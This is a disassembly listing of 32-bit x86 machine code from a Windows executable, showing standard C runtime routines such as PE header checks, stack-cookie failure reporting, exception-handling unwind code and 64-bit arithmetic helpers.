  40ced9:	74 03                	je     0x40cede
  40cedb:	33 c0                	xor    %eax,%eax
  40cedd:	c3                   	ret
  40cede:	8b 41 3c             	mov    0x3c(%ecx),%eax
  40cee1:	03 c1                	add    %ecx,%eax
  40cee3:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  40cee9:	75 f0                	jne    0x40cedb
  40ceeb:	33 c9                	xor    %ecx,%ecx
  40ceed:	66 81 78 18 0b 01    	cmpw   $0x10b,0x18(%eax)
  40cef3:	0f 94 c1             	sete   %cl
  40cef6:	8b c1                	mov    %ecx,%eax
  40cef8:	c3                   	ret
  40cef9:	cc                   	int3
  40cefa:	cc                   	int3
  40cefb:	cc                   	int3
  40cefc:	cc                   	int3
  40cefd:	cc                   	int3
  40cefe:	cc                   	int3
  40ceff:	cc                   	int3
  40cf00:	8b 44 24 04          	mov    0x4(%esp),%eax
  40cf04:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40cf07:	03 c8                	add    %eax,%ecx
  40cf09:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  40cf0d:	53                   	push   %ebx
  40cf0e:	56                   	push   %esi
  40cf0f:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
  40cf13:	33 d2                	xor    %edx,%edx
  40cf15:	85 f6                	test   %esi,%esi
  40cf17:	57                   	push   %edi
  40cf18:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
  40cf1c:	76 1e                	jbe    0x40cf3c
  40cf1e:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40cf22:	8b 48 0c             	mov    0xc(%eax),%ecx
  40cf25:	3b f9                	cmp    %ecx,%edi
  40cf27:	72 09                	jb     0x40cf32
  40cf29:	8b 58 08             	mov    0x8(%eax),%ebx
  40cf2c:	03 d9                	add    %ecx,%ebx
  40cf2e:	3b fb                	cmp    %ebx,%edi
  40cf30:	72 0c                	jb     0x40cf3e
  40cf32:	83 c2 01             	add    $0x1,%edx
  40cf35:	83 c0 28             	add    $0x28,%eax
  40cf38:	3b d6                	cmp    %esi,%edx
  40cf3a:	72 e6                	jb     0x40cf22
  40cf3c:	33 c0                	xor    %eax,%eax
  40cf3e:	5f                   	pop    %edi
  40cf3f:	5e                   	pop    %esi
  40cf40:	5b                   	pop    %ebx
  40cf41:	c3                   	ret
  40cf42:	cc                   	int3
  40cf43:	cc                   	int3
  40cf44:	cc                   	int3
  40cf45:	cc                   	int3
  40cf46:	cc                   	int3
  40cf47:	cc                   	int3
  40cf48:	cc                   	int3
  40cf49:	cc                   	int3
  40cf4a:	cc                   	int3
  40cf4b:	cc                   	int3
  40cf4c:	cc                   	int3
  40cf4d:	cc                   	int3
  40cf4e:	cc                   	int3
  40cf4f:	cc                   	int3
  40cf50:	55                   	push   %ebp
  40cf51:	8b ec                	mov    %esp,%ebp
  40cf53:	6a fe                	push   $0xfffffffe
  40cf55:	68 20 f7 40 00       	push   $0x40f720
  40cf5a:	68 d0 cb 40 00       	push   $0x40cbd0
  40cf5f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40cf65:	50                   	push   %eax
  40cf66:	83 ec 08             	sub    $0x8,%esp
  40cf69:	53                   	push   %ebx
  40cf6a:	56                   	push   %esi
  40cf6b:	57                   	push   %edi
  40cf6c:	a1 00 10 41 00       	mov    0x411000,%eax
  40cf71:	31 45 f8             	xor    %eax,-0x8(%ebp)
  40cf74:	33 c5                	xor    %ebp,%eax
  40cf76:	50                   	push   %eax
  40cf77:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40cf7a:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40cf80:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40cf83:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40cf8a:	68 00 00 40 00       	push   $0x400000
  40cf8f:	e8 3c ff ff ff       	call   0x40ced0
  40cf94:	83 c4 04             	add    $0x4,%esp
  40cf97:	85 c0                	test   %eax,%eax
  40cf99:	74 55                	je     0x40cff0
  40cf9b:	8b 45 08             	mov    0x8(%ebp),%eax
  40cf9e:	2d 00 00 40 00       	sub    $0x400000,%eax
  40cfa3:	50                   	push   %eax
  40cfa4:	68 00 00 40 00       	push   $0x400000
  40cfa9:	e8 52 ff ff ff       	call   0x40cf00
  40cfae:	83 c4 08             	add    $0x8,%esp
  40cfb1:	85 c0                	test   %eax,%eax
  40cfb3:	74 3b                	je     0x40cff0
  40cfb5:	8b 40 24             	mov    0x24(%eax),%eax
  40cfb8:	c1 e8 1f             	shr    $0x1f,%eax
  40cfbb:	f7 d0                	not    %eax
  40cfbd:	83 e0 01             	and    $0x1,%eax
  40cfc0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40cfc7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40cfca:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40cfd1:	59                   	pop    %ecx
  40cfd2:	5f                   	pop    %edi
  40cfd3:	5e                   	pop    %esi
  40cfd4:	5b                   	pop    %ebx
  40cfd5:	8b e5                	mov    %ebp,%esp
  40cfd7:	5d                   	pop    %ebp
  40cfd8:	c3                   	ret
  40cfd9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40cfdc:	8b 08                	mov    (%eax),%ecx
  40cfde:	8b 01                	mov    (%ecx),%eax
  40cfe0:	33 d2                	xor    %edx,%edx
  40cfe2:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  40cfe7:	0f 94 c2             	sete   %dl
  40cfea:	8b c2                	mov    %edx,%eax
  40cfec:	c3                   	ret
  40cfed:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40cff0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40cff7:	33 c0                	xor    %eax,%eax
  40cff9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40cffc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40d003:	59                   	pop    %ecx
  40d004:	5f                   	pop    %edi
  40d005:	5e                   	pop    %esi
  40d006:	5b                   	pop    %ebx
  40d007:	8b e5                	mov    %ebp,%esp
  40d009:	5d                   	pop    %ebp
  40d00a:	c3                   	ret
  40d00b:	55                   	push   %ebp
  40d00c:	8b ec                	mov    %esp,%ebp
  40d00e:	81 ec 28 03 00 00    	sub    $0x328,%esp
  40d014:	a3 b8 12 41 00       	mov    %eax,0x4112b8
  40d019:	89 0d b4 12 41 00    	mov    %ecx,0x4112b4
  40d01f:	89 15 b0 12 41 00    	mov    %edx,0x4112b0
  40d025:	89 1d ac 12 41 00    	mov    %ebx,0x4112ac
  40d02b:	89 35 a8 12 41 00    	mov    %esi,0x4112a8
  40d031:	89 3d a4 12 41 00    	mov    %edi,0x4112a4
  40d037:	66 8c 15 d0 12 41 00 	data16 mov %ss,0x4112d0
  40d03e:	66 8c 0d c4 12 41 00 	data16 mov %cs,0x4112c4
  40d045:	66 8c 1d a0 12 41 00 	data16 mov %ds,0x4112a0
  40d04c:	66 8c 05 9c 12 41 00 	data16 mov %es,0x41129c
  40d053:	66 8c 25 98 12 41 00 	data16 mov %fs,0x411298
  40d05a:	66 8c 2d 94 12 41 00 	data16 mov %gs,0x411294
  40d061:	9c                   	pushf
  40d062:	8f 05 c8 12 41 00    	pop    0x4112c8
  40d068:	8b 45 00             	mov    0x0(%ebp),%eax
  40d06b:	a3 bc 12 41 00       	mov    %eax,0x4112bc
  40d070:	8b 45 04             	mov    0x4(%ebp),%eax
  40d073:	a3 c0 12 41 00       	mov    %eax,0x4112c0
  40d078:	8d 45 08             	lea    0x8(%ebp),%eax
  40d07b:	a3 cc 12 41 00       	mov    %eax,0x4112cc
  40d080:	8b 85 e0 fc ff ff    	mov    -0x320(%ebp),%eax
  40d086:	c7 05 08 12 41 00 01 	movl   $0x10001,0x411208
  40d08d:	00 01 00 
  40d090:	a1 c0 12 41 00       	mov    0x4112c0,%eax
  40d095:	a3 bc 11 41 00       	mov    %eax,0x4111bc
  40d09a:	c7 05 b0 11 41 00 09 	movl   $0xc0000409,0x4111b0
  40d0a1:	04 00 c0 
  40d0a4:	c7 05 b4 11 41 00 01 	movl   $0x1,0x4111b4
  40d0ab:	00 00 00 
  40d0ae:	a1 00 10 41 00       	mov    0x411000,%eax
  40d0b3:	89 85 d8 fc ff ff    	mov    %eax,-0x328(%ebp)
  40d0b9:	a1 04 10 41 00       	mov    0x411004,%eax
  40d0be:	89 85 dc fc ff ff    	mov    %eax,-0x324(%ebp)
  40d0c4:	ff 15 28 e0 40 00    	call   *0x40e028
  40d0ca:	a3 00 12 41 00       	mov    %eax,0x411200
  40d0cf:	6a 01                	push   $0x1
  40d0d1:	e8 71 01 00 00       	call   0x40d247
  40d0d6:	59                   	pop    %ecx
  40d0d7:	6a 00                	push   $0x0
  40d0d9:	ff 15 5c e0 40 00    	call   *0x40e05c
  40d0df:	68 48 e2 40 00       	push   $0x40e248
  40d0e4:	ff 15 24 e0 40 00    	call   *0x40e024
  40d0ea:	83 3d 00 12 41 00 00 	cmpl   $0x0,0x411200
  40d0f1:	75 08                	jne    0x40d0fb
  40d0f3:	6a 01                	push   $0x1
  40d0f5:	e8 4d 01 00 00       	call   0x40d247
  40d0fa:	59                   	pop    %ecx
  40d0fb:	68 09 04 00 c0       	push   $0xc0000409
  40d100:	ff 15 20 e0 40 00    	call   *0x40e020
  40d106:	50                   	push   %eax
  40d107:	ff 15 1c e0 40 00    	call   *0x40e01c
  40d10d:	c9                   	leave
  40d10e:	c3                   	ret
  40d10f:	cc                   	int3
  40d110:	55                   	push   %ebp
  40d111:	8b ec                	mov    %esp,%ebp
  40d113:	53                   	push   %ebx
  40d114:	56                   	push   %esi
  40d115:	57                   	push   %edi
  40d116:	55                   	push   %ebp
  40d117:	6a 00                	push   $0x0
  40d119:	6a 00                	push   $0x0
  40d11b:	68 28 d1 40 00       	push   $0x40d128
  40d120:	ff 75 08             	push   0x8(%ebp)
  40d123:	e8 28 01 00 00       	call   0x40d250
  40d128:	5d                   	pop    %ebp
  40d129:	5f                   	pop    %edi
  40d12a:	5e                   	pop    %esi
  40d12b:	5b                   	pop    %ebx
  40d12c:	8b e5                	mov    %ebp,%esp
  40d12e:	5d                   	pop    %ebp
  40d12f:	c3                   	ret
  40d130:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40d134:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  40d13b:	b8 01 00 00 00       	mov    $0x1,%eax
  40d140:	74 32                	je     0x40d174
  40d142:	8b 44 24 14          	mov    0x14(%esp),%eax
  40d146:	8b 48 fc             	mov    -0x4(%eax),%ecx
  40d149:	33 c8                	xor    %eax,%ecx
  40d14b:	e8 16 fc ff ff       	call   0x40cd66
  40d150:	55                   	push   %ebp
  40d151:	8b 68 10             	mov    0x10(%eax),%ebp
  40d154:	8b 50 28             	mov    0x28(%eax),%edx
  40d157:	52                   	push   %edx
  40d158:	8b 50 24             	mov    0x24(%eax),%edx
  40d15b:	52                   	push   %edx
  40d15c:	e8 14 00 00 00       	call   0x40d175
  40d161:	83 c4 08             	add    $0x8,%esp
  40d164:	5d                   	pop    %ebp
  40d165:	8b 44 24 08          	mov    0x8(%esp),%eax
  40d169:	8b 54 24 10          	mov    0x10(%esp),%edx
  40d16d:	89 02                	mov    %eax,(%edx)
  40d16f:	b8 03 00 00 00       	mov    $0x3,%eax
  40d174:	c3                   	ret
  40d175:	53                   	push   %ebx
  40d176:	56                   	push   %esi
  40d177:	57                   	push   %edi
  40d178:	8b 44 24 10          	mov    0x10(%esp),%eax
  40d17c:	55                   	push   %ebp
  40d17d:	50                   	push   %eax
  40d17e:	6a fe                	push   $0xfffffffe
  40d180:	68 30 d1 40 00       	push   $0x40d130
  40d185:	64 ff 35 00 00 00 00 	push   %fs:0x0
  40d18c:	a1 00 10 41 00       	mov    0x411000,%eax
  40d191:	33 c4                	xor    %esp,%eax
  40d193:	50                   	push   %eax
  40d194:	8d 44 24 04          	lea    0x4(%esp),%eax
  40d198:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40d19e:	8b 44 24 28          	mov    0x28(%esp),%eax
  40d1a2:	8b 58 08             	mov    0x8(%eax),%ebx
  40d1a5:	8b 70 0c             	mov    0xc(%eax),%esi
  40d1a8:	83 fe ff             	cmp    $0xffffffff,%esi
  40d1ab:	74 3a                	je     0x40d1e7
  40d1ad:	83 7c 24 2c ff       	cmpl   $0xffffffff,0x2c(%esp)
  40d1b2:	74 06                	je     0x40d1ba
  40d1b4:	3b 74 24 2c          	cmp    0x2c(%esp),%esi
  40d1b8:	76 2d                	jbe    0x40d1e7
  40d1ba:	8d 34 76             	lea    (%esi,%esi,2),%esi
  40d1bd:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  40d1c0:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  40d1c4:	89 48 0c             	mov    %ecx,0xc(%eax)
  40d1c7:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  40d1cc:	75 17                	jne    0x40d1e5
  40d1ce:	68 01 01 00 00       	push   $0x101
  40d1d3:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  40d1d7:	e8 49 00 00 00       	call   0x40d225
  40d1dc:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  40d1e0:	e8 5f 00 00 00       	call   0x40d244
  40d1e5:	eb b7                	jmp    0x40d19e
  40d1e7:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40d1eb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40d1f2:	83 c4 18             	add    $0x18,%esp
  40d1f5:	5f                   	pop    %edi
  40d1f6:	5e                   	pop    %esi
  40d1f7:	5b                   	pop    %ebx
  40d1f8:	c3                   	ret
  40d1f9:	33 c0                	xor    %eax,%eax
  40d1fb:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  40d202:	81 79 04 30 d1 40 00 	cmpl   $0x40d130,0x4(%ecx)
  40d209:	75 10                	jne    0x40d21b
  40d20b:	8b 51 0c             	mov    0xc(%ecx),%edx
  40d20e:	8b 52 0c             	mov    0xc(%edx),%edx
  40d211:	39 51 08             	cmp    %edx,0x8(%ecx)
  40d214:	75 05                	jne    0x40d21b
  40d216:	b8 01 00 00 00       	mov    $0x1,%eax
  40d21b:	c3                   	ret
  40d21c:	53                   	push   %ebx
  40d21d:	51                   	push   %ecx
  40d21e:	bb 08 10 41 00       	mov    $0x411008,%ebx
  40d223:	eb 0b                	jmp    0x40d230
  40d225:	53                   	push   %ebx
  40d226:	51                   	push   %ecx
  40d227:	bb 08 10 41 00       	mov    $0x411008,%ebx
  40d22c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40d230:	89 4b 08             	mov    %ecx,0x8(%ebx)
  40d233:	89 43 04             	mov    %eax,0x4(%ebx)
  40d236:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  40d239:	55                   	push   %ebp
  40d23a:	51                   	push   %ecx
  40d23b:	50                   	push   %eax
  40d23c:	58                   	pop    %eax
  40d23d:	59                   	pop    %ecx
  40d23e:	5d                   	pop    %ebp
  40d23f:	59                   	pop    %ecx
  40d240:	5b                   	pop    %ebx
  40d241:	c2 04 00             	ret    $0x4
  40d244:	ff d0                	call   *%eax
  40d246:	c3                   	ret
  40d247:	83 25 1c 81 42 00 00 	andl   $0x0,0x42811c
  40d24e:	c3                   	ret
  40d24f:	cc                   	int3
  40d250:	ff 25 34 e0 40 00    	jmp    *0x40e034
  40d256:	cc                   	int3
  40d257:	cc                   	int3
  40d258:	68 ac d2 40 00       	push   $0x40d2ac
  40d25d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40d263:	50                   	push   %eax
  40d264:	8b 44 24 10          	mov    0x10(%esp),%eax
  40d268:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40d26c:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  40d270:	2b e0                	sub    %eax,%esp
  40d272:	53                   	push   %ebx
  40d273:	56                   	push   %esi
  40d274:	57                   	push   %edi
  40d275:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40d278:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40d27b:	50                   	push   %eax
  40d27c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d27f:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40d286:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40d289:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40d28c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40d292:	c3                   	ret
  40d293:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40d296:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40d29d:	59                   	pop    %ecx
  40d29e:	5f                   	pop    %edi
  40d29f:	5e                   	pop    %esi
  40d2a0:	5b                   	pop    %ebx
  40d2a1:	c9                   	leave
  40d2a2:	51                   	push   %ecx
  40d2a3:	c3                   	ret
  40d2a4:	56                   	push   %esi
  40d2a5:	43                   	inc    %ebx
  40d2a6:	32 30                	xor    (%eax),%dh
  40d2a8:	58                   	pop    %eax
  40d2a9:	43                   	inc    %ebx
  40d2aa:	30 30                	xor    %dh,(%eax)
  40d2ac:	55                   	push   %ebp
  40d2ad:	8b ec                	mov    %esp,%ebp
  40d2af:	83 ec 08             	sub    $0x8,%esp
  40d2b2:	53                   	push   %ebx
  40d2b3:	56                   	push   %esi
  40d2b4:	57                   	push   %edi
  40d2b5:	55                   	push   %ebp
  40d2b6:	fc                   	cld
  40d2b7:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40d2ba:	8b 45 08             	mov    0x8(%ebp),%eax
  40d2bd:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  40d2c4:	0f 85 c3 00 00 00    	jne    0x40d38d
  40d2ca:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40d2cd:	8b 45 10             	mov    0x10(%ebp),%eax
  40d2d0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40d2d3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40d2d6:	89 43 fc             	mov    %eax,-0x4(%ebx)
  40d2d9:	8b 73 0c             	mov    0xc(%ebx),%esi
  40d2dc:	8b 7b 08             	mov    0x8(%ebx),%edi
  40d2df:	53                   	push   %ebx
  40d2e0:	e8 ab 04 00 00       	call   0x40d790
  40d2e5:	83 c4 04             	add    $0x4,%esp
  40d2e8:	0b c0                	or     %eax,%eax
  40d2ea:	0f 8e 8f 00 00 00    	jle    0x40d37f
  40d2f0:	83 fe ff             	cmp    $0xffffffff,%esi
  40d2f3:	0f 84 8d 00 00 00    	je     0x40d386
  40d2f9:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  40d2fc:	8b 44 8f 04          	mov    0x4(%edi,%ecx,4),%eax
  40d300:	0b c0                	or     %eax,%eax
  40d302:	74 66                	je     0x40d36a
  40d304:	56                   	push   %esi
  40d305:	55                   	push   %ebp
  40d306:	8d 6b 10             	lea    0x10(%ebx),%ebp
  40d309:	33 db                	xor    %ebx,%ebx
  40d30b:	33 c9                	xor    %ecx,%ecx
  40d30d:	33 d2                	xor    %edx,%edx
  40d30f:	33 f6                	xor    %esi,%esi
  40d311:	33 ff                	xor    %edi,%edi
  40d313:	ff d0                	call   *%eax
  40d315:	5d                   	pop    %ebp
  40d316:	5e                   	pop    %esi
  40d317:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40d31a:	0b c0                	or     %eax,%eax
  40d31c:	74 4c                	je     0x40d36a
  40d31e:	78 58                	js     0x40d378
  40d320:	6a 01                	push   $0x1
  40d322:	ff 75 08             	push   0x8(%ebp)
  40d325:	e8 68 03 00 00       	call   0x40d692
  40d32a:	83 c4 08             	add    $0x8,%esp
  40d32d:	8b 7b 08             	mov    0x8(%ebx),%edi
  40d330:	53                   	push   %ebx
  40d331:	e8 da fd ff ff       	call   0x40d110
  40d336:	83 c4 04             	add    $0x4,%esp
  40d339:	8d 6b 10             	lea    0x10(%ebx),%ebp
  40d33c:	56                   	push   %esi
  40d33d:	53                   	push   %ebx
  40d33e:	e8 32 fe ff ff       	call   0x40d175
  40d343:	83 c4 08             	add    $0x8,%esp
  40d346:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  40d349:	6a 01                	push   $0x1
  40d34b:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  40d34f:	e8 d1 fe ff ff       	call   0x40d225
  40d354:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  40d357:	89 43 0c             	mov    %eax,0xc(%ebx)
  40d35a:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  40d35e:	33 db                	xor    %ebx,%ebx
  40d360:	33 c9                	xor    %ecx,%ecx
  40d362:	33 d2                	xor    %edx,%edx
  40d364:	33 f6                	xor    %esi,%esi
  40d366:	33 ff                	xor    %edi,%edi
  40d368:	ff d0                	call   *%eax
  40d36a:	8b 7b 08             	mov    0x8(%ebx),%edi
  40d36d:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  40d370:	8b 34 8f             	mov    (%edi,%ecx,4),%esi
  40d373:	e9 78 ff ff ff       	jmp    0x40d2f0
  40d378:	b8 00 00 00 00       	mov    $0x0,%eax
  40d37d:	eb 23                	jmp    0x40d3a2
  40d37f:	8b 45 08             	mov    0x8(%ebp),%eax
  40d382:	83 48 04 08          	orl    $0x8,0x4(%eax)
  40d386:	b8 01 00 00 00       	mov    $0x1,%eax
  40d38b:	eb 15                	jmp    0x40d3a2
  40d38d:	55                   	push   %ebp
  40d38e:	8d 6b 10             	lea    0x10(%ebx),%ebp
  40d391:	6a ff                	push   $0xffffffff
  40d393:	53                   	push   %ebx
  40d394:	e8 dc fd ff ff       	call   0x40d175
  40d399:	83 c4 08             	add    $0x8,%esp
  40d39c:	5d                   	pop    %ebp
  40d39d:	b8 01 00 00 00       	mov    $0x1,%eax
  40d3a2:	5d                   	pop    %ebp
  40d3a3:	5f                   	pop    %edi
  40d3a4:	5e                   	pop    %esi
  40d3a5:	5b                   	pop    %ebx
  40d3a6:	8b e5                	mov    %ebp,%esp
  40d3a8:	5d                   	pop    %ebp
  40d3a9:	c3                   	ret
  40d3aa:	55                   	push   %ebp
  40d3ab:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40d3af:	8b 29                	mov    (%ecx),%ebp
  40d3b1:	8b 41 1c             	mov    0x1c(%ecx),%eax
  40d3b4:	50                   	push   %eax
  40d3b5:	8b 41 18             	mov    0x18(%ecx),%eax
  40d3b8:	50                   	push   %eax
  40d3b9:	e8 b7 fd ff ff       	call   0x40d175
  40d3be:	83 c4 08             	add    $0x8,%esp
  40d3c1:	5d                   	pop    %ebp
  40d3c2:	c2 04 00             	ret    $0x4
  40d3c5:	cc                   	int3
  40d3c6:	cc                   	int3
  40d3c7:	cc                   	int3
  40d3c8:	cc                   	int3
  40d3c9:	cc                   	int3
  40d3ca:	cc                   	int3
  40d3cb:	cc                   	int3
  40d3cc:	cc                   	int3
  40d3cd:	cc                   	int3
  40d3ce:	cc                   	int3
  40d3cf:	cc                   	int3
  40d3d0:	57                   	push   %edi
  40d3d1:	56                   	push   %esi
  40d3d2:	53                   	push   %ebx
  40d3d3:	33 ff                	xor    %edi,%edi
  40d3d5:	8b 44 24 14          	mov    0x14(%esp),%eax
  40d3d9:	0b c0                	or     %eax,%eax
  40d3db:	7d 14                	jge    0x40d3f1
  40d3dd:	47                   	inc    %edi
  40d3de:	8b 54 24 10          	mov    0x10(%esp),%edx
  40d3e2:	f7 d8                	neg    %eax
  40d3e4:	f7 da                	neg    %edx
  40d3e6:	83 d8 00             	sbb    $0x0,%eax
  40d3e9:	89 44 24 14          	mov    %eax,0x14(%esp)
  40d3ed:	89 54 24 10          	mov    %edx,0x10(%esp)
  40d3f1:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40d3f5:	0b c0                	or     %eax,%eax
  40d3f7:	7d 14                	jge    0x40d40d
  40d3f9:	47                   	inc    %edi
  40d3fa:	8b 54 24 18          	mov    0x18(%esp),%edx
  40d3fe:	f7 d8                	neg    %eax
  40d400:	f7 da                	neg    %edx
  40d402:	83 d8 00             	sbb    $0x0,%eax
  40d405:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40d409:	89 54 24 18          	mov    %edx,0x18(%esp)
  40d40d:	0b c0                	or     %eax,%eax
  40d40f:	75 18                	jne    0x40d429
  40d411:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40d415:	8b 44 24 14          	mov    0x14(%esp),%eax
  40d419:	33 d2                	xor    %edx,%edx
  40d41b:	f7 f1                	div    %ecx
  40d41d:	8b d8                	mov    %eax,%ebx
  40d41f:	8b 44 24 10          	mov    0x10(%esp),%eax
  40d423:	f7 f1                	div    %ecx
  40d425:	8b d3                	mov    %ebx,%edx
  40d427:	eb 41                	jmp    0x40d46a
  40d429:	8b d8                	mov    %eax,%ebx
  40d42b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40d42f:	8b 54 24 14          	mov    0x14(%esp),%edx
  40d433:	8b 44 24 10          	mov    0x10(%esp),%eax
  40d437:	d1 eb                	shr    $1,%ebx
  40d439:	d1 d9                	rcr    $1,%ecx
  40d43b:	d1 ea                	shr    $1,%edx
  40d43d:	d1 d8                	rcr    $1,%eax
  40d43f:	0b db                	or     %ebx,%ebx
  40d441:	75 f4                	jne    0x40d437
  40d443:	f7 f1                	div    %ecx
  40d445:	8b f0                	mov    %eax,%esi
  40d447:	f7 64 24 1c          	mull   0x1c(%esp)
  40d44b:	8b c8                	mov    %eax,%ecx
  40d44d:	8b 44 24 18          	mov    0x18(%esp),%eax
  40d451:	f7 e6                	mul    %esi
  40d453:	03 d1                	add    %ecx,%edx
  40d455:	72 0e                	jb     0x40d465
  40d457:	3b 54 24 14          	cmp    0x14(%esp),%edx
  40d45b:	77 08                	ja     0x40d465
  40d45d:	72 07                	jb     0x40d466
  40d45f:	3b 44 24 10          	cmp    0x10(%esp),%eax
  40d463:	76 01                	jbe    0x40d466
  40d465:	4e                   	dec    %esi
  40d466:	33 d2                	xor    %edx,%edx
  40d468:	8b c6                	mov    %esi,%eax
  40d46a:	4f                   	dec    %edi
  40d46b:	75 07                	jne    0x40d474
  40d46d:	f7 da                	neg    %edx
  40d46f:	f7 d8                	neg    %eax
  40d471:	83 da 00             	sbb    $0x0,%edx
  40d474:	5b                   	pop    %ebx
  40d475:	5e                   	pop    %esi
  40d476:	5f                   	pop    %edi
  40d477:	c2 10 00             	ret    $0x10
  40d47a:	cc                   	int3
  40d47b:	cc                   	int3
  40d47c:	cc                   	int3
  40d47d:	cc                   	int3
  40d47e:	cc                   	int3
  40d47f:	cc                   	int3
  40d480:	53                   	push   %ebx
  40d481:	56                   	push   %esi
  40d482:	8b 44 24 18          	mov    0x18(%esp),%eax
  40d486:	0b c0                	or     %eax,%eax
  40d488:	75 18                	jne    0x40d4a2
  40d48a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40d48e:	8b 44 24 10          	mov    0x10(%esp),%eax
  40d492:	33 d2                	xor    %edx,%edx
  40d494:	f7 f1                	div    %ecx
  40d496:	8b d8                	mov    %eax,%ebx
  40d498:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40d49c:	f7 f1                	div    %ecx
  40d49e:	8b d3                	mov    %ebx,%edx
  40d4a0:	eb 41                	jmp    0x40d4e3
  40d4a2:	8b c8                	mov    %eax,%ecx
  40d4a4:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  40d4a8:	8b 54 24 10          	mov    0x10(%esp),%edx
  40d4ac:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40d4b0:	d1 e9                	shr    $1,%ecx
  40d4b2:	d1 db                	rcr    $1,%ebx
  40d4b4:	d1 ea                	shr    $1,%edx
  40d4b6:	d1 d8                	rcr    $1,%eax
  40d4b8:	0b c9                	or     %ecx,%ecx
  40d4ba:	75 f4                	jne    0x40d4b0
  40d4bc:	f7 f3                	div    %ebx
  40d4be:	8b f0                	mov    %eax,%esi
  40d4c0:	f7 64 24 18          	mull   0x18(%esp)
  40d4c4:	8b c8                	mov    %eax,%ecx
  40d4c6:	8b 44 24 14          	mov    0x14(%esp),%eax
  40d4ca:	f7 e6                	mul    %esi
  40d4cc:	03 d1                	add    %ecx,%edx
  40d4ce:	72 0e                	jb     0x40d4de
  40d4d0:	3b 54 24 10          	cmp    0x10(%esp),%edx
  40d4d4:	77 08                	ja     0x40d4de
  40d4d6:	72 07                	jb     0x40d4df
  40d4d8:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  40d4dc:	76 01                	jbe    0x40d4df
  40d4de:	4e                   	dec    %esi
  40d4df:	33 d2                	xor    %edx,%edx
  40d4e1:	8b c6                	mov    %esi,%eax
  40d4e3:	5e                   	pop    %esi
  40d4e4:	5b                   	pop    %ebx
  40d4e5:	c2 10 00             	ret    $0x10
  40d4e8:	cc                   	int3
  40d4e9:	cc                   	int3
  40d4ea:	cc                   	int3
  40d4eb:	cc                   	int3
  40d4ec:	cc                   	int3
  40d4ed:	cc                   	int3
  40d4ee:	cc                   	int3
  40d4ef:	cc                   	int3
  40d4f0:	8b 44 24 08          	mov    0x8(%esp),%eax
  40d4f4:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40d4f8:	0b c8                	or     %eax,%ecx
  40d4fa:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40d4fe:	75 09                	jne    0x40d509
  40d500:	8b 44 24 04          	mov    0x4(%esp),%eax
  40d504:	f7 e1                	mul    %ecx
  40d506:	c2 10 00             	ret    $0x10
  40d509:	53                   	push   %ebx
